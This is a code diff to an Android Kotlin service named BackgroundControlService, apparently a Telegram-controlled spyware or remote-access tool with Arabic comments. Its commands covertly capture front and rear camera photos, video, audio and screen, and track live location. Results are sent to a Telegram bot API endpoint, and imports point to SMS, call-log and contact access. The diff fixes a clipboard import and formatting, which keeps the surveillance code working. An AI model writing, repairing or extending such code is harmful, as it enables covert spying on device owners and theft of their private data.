@@ -10,6 +10,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.content.ClipboardManager // <-- التعديل الهندسي الصحيح لاستيراد الحافظة
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
@@ -21,7 +22,6 @@ import android.os.Environment
 import android.os.IBinder
 import android.os.Looper
 import android.provider.CallLog
-import android.provider.ClipboardManager
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.telephony.SmsManager
@@ -178,7 +178,7 @@ class BackgroundControlService : Service() {
             when {
                 data == "take_photo" -> captureCameraImage(chatId, "front")
                 data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
-                data == "record_video" -> executeCameraVideoRecording(chatId, 10) // تسجيل فيديو حقيقي لمدة 10 ثوانٍ
+                data == "record_video" -> executeCameraVideoRecording(chatId, 10)
                 data == "record_screen" -> sendDirectMessage(chatId, "🎬 جاري تهيئة التقاط شاشة العرض...")
                 data == "record_audio" -> executeAudioCapture(chatId, 30)
                 data == "get_location" -> fetchStrictRealTimeLocation(chatId)
@@ -222,7 +222,6 @@ class BackgroundControlService : Service() {
         }
     }
 
-    // [تسجيل الفيديو الحقيقي الفعلي]
     private fun executeCameraVideoRecording(chatId: String, durationSeconds: Int) {
         if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
             sendDirectMessage(chatId, "❌ صلاحيات الكاميرا أو الميكروفون غير ممنوحة.")
@@ -675,7 +674,7 @@ class BackgroundControlService : Service() {
                 }
 
                 val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
-                    conn.requestMethod = "POST"
+                conn.requestMethod = "POST"
                 conn.doOutput = true
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.outputStream.use { it.write(body.toString().toByteArray()) }
